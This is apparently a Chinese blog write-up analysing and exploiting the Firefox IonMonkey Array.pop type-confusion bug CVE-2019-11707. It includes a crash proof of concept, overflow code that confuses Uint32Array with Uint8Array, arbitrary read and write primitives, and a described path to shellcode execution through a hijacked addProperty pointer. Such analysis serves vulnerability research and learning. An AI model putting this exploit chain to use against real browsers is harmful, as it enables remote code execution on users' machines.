漏洞描述

六月份的时候，Firefox 曝出严重安全漏洞 (CVE-2019-11707)，可用于实施远程代码执行攻击。据悉，该漏洞是 Array.pop 中的问题所致：在操作 JavaScript 对象时或会出现类型混淆漏洞，从而触发可利用的崩溃。

漏洞原理和利用方法：

  • IonMonkey未检查当前元素原型上的索引元素，只检查ArrayPrototype。内联后会导致Array.pop类型混淆。

  • 我们混淆a Uint32Array和a Uint8Array来获取溢出ArrayBuffer并继续将其转换为任意读写并执行shellcode。

这篇文章主要关注漏洞利用，这是我第一次尝试分析利用JIT漏洞，所以如果有人在阅读这篇文章中发现任何错误，请纠正我:)



漏洞分析

漏洞主要问题是，IonMonkey在内联Arrary.prototype.pop和Arrary.prototype.push时，Arrary.prototype.slice并没有检查它的原型上的索引元素。它只检查Array原型链上是否有任何索引元素，但是像研究员saelo解释的那样，使用目标对象和Array原型之间的中间链可以很容易地绕过它。


内联缓存和原型链？

原型链是JavaScript实现继承的方式，它允许我们在各种对象之间共享属性和方法。

内联缓存意味着保存先前查找的结果，以便下次进行相同的查找时，直接使用保存的值并保存查找的文本。因此，如果我们试图调用Array.pop()，那么初始查找会涉及获取数组对象的原型，然后在其属性中搜索pop函数，最后获取pop函数的地址。现在，如果此时pop函数被内联，则保存此函数的地址，并且在下次Array.pop调用时，不需要重新计算所有这些查找。


现在让我们来看看saelo发现的崩溃代码

// Run with --no-threads for increased reliability
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
function v7(v8,v9) {
    if (v4.length == 0) {
        v4[3] = {a: 5};
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when  p[0] is fetched here.
    const v11 = v4.pop();

    // Then if will crash here when dereferencing a controlled double value as pointer.
    v11.a;

    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
p[0] = -1.8629373288622089e-06;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}


最初是一个数组，v4创建所有元素作为对象。SpiderMonkey的类型推理系统，注意到这一点并推断const数组v4将始终保存对象。

现在p使用所有对象初始化另一个数组，并将p[0]其设置为浮点值。数组的原型v4已更改，但类型推断系统不会跟踪此情况。


来看看函数v7，虽然数组中有元素，但它们只是弹出a并访问其属性。

for函数尾部的循环强制IonMonkey将JIT编译为本机程序集。Array.pop在内联时，IonMonkey发现返回的Array.pop类型与推断类型相同，因此不会报告任何类型错误。然后它假定返回类型将始终是一个对象，并继续删除弹出元素上的所有类型检查。


这就是漏洞所在。Array.pop在内联时，IonMonkey应该检查数组的原型没有任何索引属性。相反，它只检查ArrayPrototype没有任何索引属性。所以这意味着如果我们在数组和ArrayPrototype之间有一个中间原型，那么那个元素就不会被检查了！这是js/src/jit/MCallOptimize.cpp函数IonBuilder::inlineArrayPopShift中的相关代码段

bool hasIndexedProperty;
MOZ_TRY_VAR(hasIndexedProperty, ArrayPrototypeHasIndexedProperty(this, script()));
if (hasIndexedProperty) {
    trackOptimizationOutcome(TrackedOutcome::ProtoIndexedProps);
    return InliningStatus_NotInlined;
    }


以下是绕过这个问题的方法


那么将索引元素放在数组原型上有什么好处呢？当数组是稀疏数组并Array.pop遇到emptyelement（JS_ELEMENTS_HOLE）时，它会向原型链扫描具有索引元素的原型，以及与所需索引对应的元素。例如，

js> a=[]
[]
js> a[1]=1 // Sparse Array - element at index 0 does not exist
1
js> a
[, 1]
js> a.__proto__=[1234]
[1234]
js> a.pop()
1
js> a.pop() // Since a[0] is empty, and a.__proto__[0] exists, a.__proto__[0] is returned by Array.pop
1234


问题是当JIT编译函数时v7，所有类型检查都被删除，因为观察到的类型与推断类型相同，并且TI系统不跟踪原型上的类型。在从数组中弹出所有原始元素后v4，如果v7再次调用，则将v4[3]设置为对象。这意味着，v4是因为现在的稀疏阵列v4[0]，v4[1]和v4[2]是空的。因此，Array.pop试图弹出，v4[2]和v4[1]从原型返回值。

现在，当它尝试对v4[0]执行相同操作时，将返回浮点值而不是对象。但是Ion仍然认为Array.pop是一个对象，就是因为没有类型检查！然后，Ion继续执行PoC代码后面的部分，并尝试获取返回对象a的属性。现在就崩溃了，因为返回的值不是指向对象的指针，而是用户控制的浮点数。


任意地址读写

我花了很多时间试图泄漏内存。最初我的想法是创建一个浮点数组并将原型上的元素设置为一个对象。因此，Ion会假设Array.pop总是返回一个浮点数并将对象指针视为浮点数并泄漏指针的地址。

但由于我无法从这种方法泄漏内存，不得不花一些时间考虑替代方案。


Uint8Array和Uint32Array

在查看类型数组赋值时，我发现了一些有趣的东西

mov    edx,DWORD PTR [rcx+0x28] # rcx contains the starting address of the typed array
cmp    edx,eax
jbe    0x6c488017337
xor    ebx,ebx
cmp    eax,edx
cmovb  ebx,eax
mov    rcx,QWORD PTR [rcx+0x38] # after this rcx contains the underlying buffer
mov    DWORD PTR [rcx+rbx*4],0x80


rcx是指向类型化数组的指针，eax包含我们分配的索引。[rcx+0x28]实际上保持了类型化数组的大小。因此，进行检查以确保索引小于大小但不进行检查以验证对象的类型。这意味着，如果编译的JIT代码用于a Uint32Array并且原型包含a Uint8Array，则会出现溢出。这是因为Ion总是期望得到a Uint32Array（从汇编代码的最后一行显而易见，它直接执行a mov DWORD PTR），但如果类型化数组是a Uint8Array，那么它的大小会更大（因为现在每个元素都是一个word而不是dword）。

因此，如果我们传递一个大于该Uint32Array大小的索引，它将通过检查并初始化。

例如

v11[a1] = 0x80


其中v11 = a Uint32Array。底层的大小ArrayBuffer是32字节。这意味着它的大小Uint32Array是32/4 = 8个元素。现在，如果v11突然变为Uint8Array同一个底层ArrayBuffer，则size（[rcx+0x28]）为32/1 = 32个元素。但是在分配值时，代码仍然使用a mov DWORD PTR而不是a mov BYTE PTR。因此，如果我们将索引设为30，那么检查将在与32（而不是8 :)进行比较时传递。因此我们可以写入buffer_base+(30*4) = buffer_base+120，但是缓冲区只有32个字节长！

现在要做的就是将缓冲区溢出转换为任意读写。这个溢出在缓冲区ArrayBuffer中。现在，如果缓冲区足够小，那么这个缓冲区是内联的。

先看一下可以实现此溢出的代码。

buf = []
for(var i=0;i<100;i++)
{
  buf.push(new ArrayBuffer(0x20));
}

var abuf = buf[5];

var e = new Uint32Array(abuf);
const arr = [e, e, e, e, e];

function vuln(a1) {

    if (arr.length == 0) {
        arr[3] = e;
    }

    /*

    If the length of the array becomes zero then we set the third element of
    the array thus converting it into a sparse array without changing the
    type of the array elements. Thus spidermonkey's Type Inference System does
    not insert a type barrier.

    */

    const v11 = arr.pop();
    v11[a1] = 0x80
    for (let v15 = 0; v15 < 100000; v15++) {}
}

p = [new Uint8Array(abuf), e, e];
arr.__proto__ = p;

for (let v31 = 0; v31 < 2000; v31++) {
    vuln(18);
}


buf是一个ArrayBuffer大小为0x20 的数组。在内存中，所有这些分配ArrayBuffer将连续存在。


现在，如果在buf数组上的第二个元素的数据缓冲区中有溢出，那么就可以编辑连续的ArrayBuffer元数据。ArrayBuffer即实际指定数据缓冲区长度的字段。

在上面的代码中，我们编辑ArrayBufferat索引6 的长度并将其设置为0x80。因此，现在可以从第7个元素的元数据泄漏数据并获得我们想要的泄漏的内存地址！

leaker = new Uint8Array(buf[7]);
aa = new Uint8Array(buf[6]);

leak = aa.slice(0x50,0x58);
group = aa.slice(0x40,0x48);


现在可以泄漏地址，我们需要将其转换为任意读写原语。为此，我们将编辑移位指针指向ArrayBufferat索引7的数据缓冲区以指向任意地址。保留这个任意地址作为Uint8Array我们刚刚泄露的地址。因此，下次我们创建一个ArrayBuffer时，它的数据缓冲区将指向一个Uint8Array（即leaker）。

现在有了这个地址，就可以编辑leaker对象的数据指针并将其指向我们想要的任何地方。之后，查看数组会泄漏该地址的值，并且写入该数组会编辑该地址的内容。

changer = new Uint8Array(buf[7])

function write(addr,value){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    value.reverse()
    for (var i=0;i<8;i++)
      leaker[i]=value[i]
}

function read(addr){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return leaker.slice(0,8)
}


现在在内存中有了任意读写权限，我们所要做的就是将其转换为代码执行！


实现代码执行

每个对象都与一个由JSClass对象组成的组相关联。该JSClass含有元素ClassOps，其中包含函数指针控制属性的添加，删除等方法。如果我们能够劫持这个函数指针，就可以到达任意代码执行。


我们可以使用选择的地址覆盖class_指针。在这个地址，我们构建整个js::Class结构。至于字段，我们可以从原始的Class对象泄漏出来。这里我们只需要确保cOps指向我们在内存中编写的函数指针表。在这个漏洞利用中，我将addProperty使用指向shellcode的指针覆盖该字段

为什么要将此函数指定为buf[7]属性？通过buf[7]属性，我们可以使用任意读取原语获取其任何属性的地址。这样我们就可以得到这个函数的地址。

但在继续进行之前，先让JIT编译我们的函数....

for (i=0;i<100000;i++) buf[7].func()


现在编译了自己的shellcode！但是我们还不知道那个shellcode的地址，这就是我们将此功能指定为buf[7]属性的原因。由于这是添加的最新属性，它将位于slots缓冲区的顶部，并且具有我们所拥有的任意读取权限，因此我们可以轻松读取此地址。

一旦我们有了函数的基地址，就可以泄漏一个JIT指针JSFunction的jitInfo_结构。在此之后我们只需要找到shellcode的起始位置，这就是我们在shellcode的开头包含了一个magic值的原因。

所以现在我们拥有了实现控制流所需的一切 ：一个覆盖的目标，一个跳转到的目标和一个任意的rw原语。

现在就可以去覆盖clasp_关注的那个指针了，首先我们创建一个Uint8Array来保存我们的shellcode。然后我们得到这个地址，Uint8Array就像我们找到编译shellcode的函数地址一样。我们的目标是获取保存shellcode的缓冲区的地址。一旦我们得到了Uint8Array包含shellcode 的起始地址，然后就加上0x38，就可以得到存储原始shellcode的缓冲区的地址。

现在此区域还不可执行，但我们可以通过使用stager shellcode来实现。在这个漏洞利用中，我将使用函数指针addProperty来实现代码执行。当我们尝试向对象添加属性时，会使用此指针。

obj.trigger = some_variable


当调用它时，rcx寄存器包含一个指向要添加的属性的指针。因此，可以以这种方式将一些参数传递给stager shellcode。我将shellcode缓冲区的地址传递给stager shellcode。stager shellcode下的整个页面具有rwx权限，然后跳转到我们的shellcode中。

这里shellcode会调用execveexecute /usr/bin/xcalc。
